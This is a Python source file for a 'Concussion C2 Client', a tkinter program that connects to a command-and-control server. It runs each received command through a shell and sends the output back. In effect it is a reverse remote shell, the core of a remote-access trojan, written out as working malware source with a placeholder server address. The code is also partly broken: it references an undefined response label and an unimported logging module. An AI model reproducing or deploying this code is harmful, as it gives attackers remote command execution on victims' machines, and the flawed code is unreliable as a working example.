import tkinter as tk
import socket
import threading
import subprocess

# Create the main application window
root = tk.Tk()
root.title("Concussion C2 Client")
root.geometry("700x500")

# Define the common color scheme
root.configure(bg="#000046")

# Create a socket for the client
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Initialize the client socket

# Define the server's IP address and port
SERVER_IP = '127.0.0.1'  # Replace with the actual IP address of your C2 server
SERVER_PORT = 2222  # Replace with the actual port your server is listening on

error_message = None  # Initialize the error message variable

try:
    print("Attempting to connect to the server...")
    client_socket.connect((SERVER_IP, SERVER_PORT))
    print("Connected to the server successfully.")
except Exception as e:
    error_message = f"Connection Error: {e}"
    print(f"Error connecting to the server: {e}")

# Define and initialize the status label
status_label = tk.Label(root, text="Connection Status: Connecting...", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
status_label.pack(padx=10, pady=10)

# Function to update the response label
def update_response(message):
    if error_message:
        message = error_message  # If an error occurred, display it
    response_label.config(text=message)

# Function to handle commands from the server (unchanged)
def handle_command(command):
    try:
        result = execute_command(command)
        update_response(result)
        send_response_to_server(result)
    except Exception as e:
        update_response(f"Error: {e}")

# Function to execute commands
def execute_command(command):
    try:
        # Use subprocess to run the command with administrative privileges
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = process.communicate()

        # Check if the command was successful
        if process.returncode == 0:
            return f"Command executed successfully:\n\n{output.decode('utf-8')}"
        else:
            return f"Command failed with error:\n\n{error.decode('utf-8')}"

    except Exception as e:
        return f"Error: {e}"

# Function to send responses to the server
def send_response_to_server(response):
    try:
        if client_socket is not None:
            # Send the response to the server
            client_socket.send(response.encode('utf-8'))

    except Exception as e:
        update_response(f"Error sending response to server: {e}")

# Function to listen for commands from the server
def listen_for_commands():
    try:
        while True:
            if client_socket is not None:
                command = client_socket.recv(1024).decode('utf-8')
                if not command:
                    break

                handle_command(command)

    except Exception as e:
        update_response(f"Error in command_listener_thread: {e}")
        logging.error(f"Error in command_listener_thread: {e}")
        # You can also choose to terminate the thread or take other actions here
    finally:
        # Close the client socket when the thread exits
        if client_socket is not None:
            client_socket.close()
            
# Print a message when starting to listen for commands
print("Starting to listen for commands from the server...")
command_listener_thread = threading.Thread(target=listen_for_commands)
command_listener_thread.start()

# Run the GUI application
root.mainloop()
